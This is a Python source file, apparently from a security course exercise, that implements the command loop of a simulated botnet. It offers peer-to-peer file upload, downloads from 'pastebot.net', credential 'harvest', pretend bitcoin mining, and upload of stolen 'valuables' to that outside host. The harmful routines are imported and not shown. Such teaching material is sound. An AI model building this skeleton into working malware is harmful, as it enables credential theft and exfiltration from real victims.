import socket
import time
import threading

from lib.evil import bitcoin_mine, harvest_user_pass
from lib.p2p import find_bot, bot_server
from lib.files import download_from_pastebot, filestore, p2p_upload_file, save_valuable, upload_valuables_to_pastebot, valuables

def p2p_upload(fn):
    sconn = find_bot()
    sconn.send(bytes("FILE", "ascii"))
    p2p_upload_file(sconn, fn)

def p2p_echo():
    try:
        sconn = find_bot()
        # Set verbose to true so we can view the encoded packets
        sconn.verbose = True
        sconn.send(bytes("ECHO", "ascii"))
        while 1:
            # Read a message and send it to the other bot
            msg = input("Echo> ")
            byte_msg = bytes(msg, "ascii")
            sconn.send(byte_msg)
            # This other bot should echo it back to us
            echo = sconn.recv()
            # Ensure that what we sent is what we got back
            assert(echo == byte_msg)
            # If the msg is X, then terminate the connection
            if msg.lower() == 'x' or msg.lower() == "exit" or msg.lower() == "quit":
                sconn.close()
                break
    except socket.error:
        print("Connection closed unexpectedly")

if __name__ == "__main__":
    # Start a new thread to accept P2P echo or P2P upload requests
    thr = threading.Thread(target=bot_server)
    # Daemon threads exit when the main program exits
    # This means the server will shut down automatically when we quit
    thr.setDaemon(True)
    thr.start()
    # Wait for a small amount of time so that the output
    # doesn't play around with our "command prompt"
    time.sleep(0.3)

    while 1:
        # Naive command loop
        # There are better ways to do this, but the code should be clear
        raw_cmd = input("Enter command: ")
        cmd = raw_cmd.split()
        if not cmd:
            print("You need to enter a command...")
            continue
        # P2P Commands
        # Echo is primarily meant for testing (the receiver will echo what it hears back)
        # Upload allows for peer-to-peer file transfer to other bots
        if cmd[0].lower() == "p2p":
            if len(cmd) > 1:
                if cmd[1].lower() == "echo":
                    p2p_echo()
                if cmd[1].lower() == "upload":
                    if len(cmd) == 3:
                        p2p_upload(cmd[2])
                    else:
                        print("Format is 'p2p upload <filename>'")
            else:
                print("The p2p command requires either 'echo' or 'upload' after it")
        # Download a file (update or data) from pastebot.net
        elif cmd[0].lower() == "download":
            if len(cmd) == 2:
                download_from_pastebot(cmd[1])
            else:
                print("The download command requires a filename afterwards")
        # Upload the valuables/secrets the bot has discovered to pastebot.net
        elif cmd[0].lower() == "upload":
            if len(cmd) == 2:
                upload_valuables_to_pastebot(cmd[1])
            else:
                print("The upload command requires a filename afterwards")
        # Mine for Bitcoins
        # This is far more intensive in the real world, but we'll just pretend ;)
        elif cmd[0].lower() == "mine":
            print("Mining for Bitcoins...")
            bit_addr = bitcoin_mine()
            save_valuable("Bitcoin: %s" % bit_addr)
            print("Mined and found Bitcoin address: %s" % bit_addr)
        # Harvest a user's username and password (userpass)
        elif cmd[0].lower() == "harvest":
            userpass = harvest_user_pass()
            save_valuable("Username/Password: %s %s" % userpass)
            print("Found user pass: %s" % (userpass,))
        # List files and valuables (secrets such as userpass & bitcoins) the bot has
        elif cmd[0].lower() == "list":
            print("Files stored by this bot: %s" % ", ".join(filestore.keys()))
            print("Valuables stored by this bot: %s" % valuables)
        # Exit command
        elif cmd[0].lower() == "quit" or cmd[0].lower() == "exit":
            break
        else:
            print("Command not recognised")
